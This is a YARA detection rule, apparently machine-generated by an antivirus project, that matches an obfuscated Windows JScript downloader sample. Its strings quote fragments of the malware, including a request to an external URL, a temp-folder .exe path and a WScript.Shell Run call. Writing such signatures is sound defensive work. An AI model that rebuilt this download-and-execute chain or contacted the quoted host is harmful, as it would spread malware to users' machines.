rule sig_20160328_f7509fa55f14a2dec307d87363c5dafe {
  meta:
    description = "datamaliciousorder - file 20160328_f7509fa55f14a2dec307d87363c5dafe.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0f01ec881e8e78cda174400b2b9b57613c93a2957d764b5eb49a0e6d98c13190"

  strings:
    $s1  = "function Gzica() {return Gebogmeudo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"e50KwufC.exe\";};" fullword ascii
    $s2  = "do {WScript[Aestch](Jrwtrqfv() * 11)} while (Gzmjqqcvz[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Gzmjqqcvz[Crtmfdk](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s4  = "function Dppauydjsh(Urhvozeev, Usoargm){return Urhvozeev - Usoargm;};" fullword ascii
    $s5  = "var Gebogmeudo = function Yuemkudp() {return WScript[Dttmlfuqi](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ytcxft() {return ((Pfgrhli == true) && (Pfgrhli == Vwvityeiwg)) ? 1 : Atgaq;};" fullword ascii
    $s7  = "function Jgbpqbyxrm(Pbuzpp){Gebogmeudo[\"Run\"](Pbuzpp, Atgaq, Atgaq);};" fullword ascii
    $s8  = "var Pfgrhli = false;" fullword ascii
    $s9  = "Pfgrhli = true; " fullword ascii
    $s10 = "var Fwals = false;" fullword ascii
    $s11 = " while (Ynkwrytp){" fullword ascii
    $s12 = "function Wadun(){return Dttmlfuqi;};" fullword ascii
    $s13 = "function Vuubvhcb(Kzukem) {var Uvdlaazdz = (1, 2, 3, 4, 5, Kzukem); return Uvdlaazdz;};" fullword ascii
    $s14 = "var Pcdqpnd = new this[\"Date\"]();" fullword ascii
    $s15 = "function Jrwtrqfv(){return 22;};" fullword ascii
    $s16 = "function Rrhhd(){return Blumglqdx;};" fullword ascii
    $s17 = "return Dppauydjsh(Fcnoweopik, Wvivw);" fullword ascii
    $s18 = "Vwvityeiwg = true; " fullword ascii
    $s19 = "var Vwvityeiwg = false;" fullword ascii
    $s20 = "function Wxbevieguu()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}